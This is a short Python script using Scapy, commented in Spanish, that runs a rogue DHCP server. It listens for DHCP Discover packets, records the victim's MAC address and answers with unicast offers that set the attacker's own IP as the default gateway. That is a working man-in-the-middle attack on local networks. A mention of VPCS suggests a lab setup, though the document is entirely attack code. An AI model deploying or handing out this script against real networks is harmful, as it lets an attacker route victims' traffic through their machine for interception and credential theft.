from scapy.all import *
import time

# --- CONFIGURACIÓN ---
IFACE = "eth0"
MY_IP = "24.12.52.121"       # Tu IP
FAKE_GW = "24.12.52.121"     # Tu IP como Gateway
OFFER_IP = "24.12.52.150"  # IP objetivo

def reply(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1: # Si es Discover
        mac_target = pkt[Ether].src  # Capturamos la MAC de la víctima
        xid = pkt[BOOTP].xid
        print(f"[+] Petición detectada de {mac_target}")

        # 1. Padding de la MAC (necesario para VPCS)
        raw_mac = mac2str(mac_target)
        chaddr_padded = raw_mac + b'\x00' * 10 

        # 2. CORRECCIÓN: Destino Ethernet = MAC DE LA VÍCTIMA (No Broadcast)
        # Antes: dst="ff:ff:ff:ff:ff:ff"  <-- ERROR
        # Ahora: dst=mac_target           <-- ACIERTO
        eth = Ether(src=get_if_hwaddr(IFACE), dst=mac_target)
        
        ip = IP(src=MY_IP, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        
        bootp = BOOTP(op=2, yiaddr=OFFER_IP, siaddr=MY_IP, 
                      chaddr=chaddr_padded, xid=xid)
        
        dhcp = DHCP(options=[
            ("message-type", "offer"),
            ("server_id", MY_IP),
            ("subnet_mask", "255.255.255.0"),
            ("router", FAKE_GW),
            ("name_server", "8.8.8.8"),
            ("lease_time", 1800),
            "end"
        ])
        
        # 3. Mantenemos el Padding extra al final por si acaso
        packet = eth / ip / udp / bootp / dhcp / Padding(load=b'\x00'*30)
        
        # Enviar
        for _ in range(3):
            sendp(packet, iface=IFACE, verbose=0)
        print(f"[+] ¡Oferta Unicast Enviada a {mac_target}!")

print(f"[*] Rogue Server (Modo Unicast) listo en {IFACE}...")
sniff(filter="udp and port 67", prn=reply, store=0)
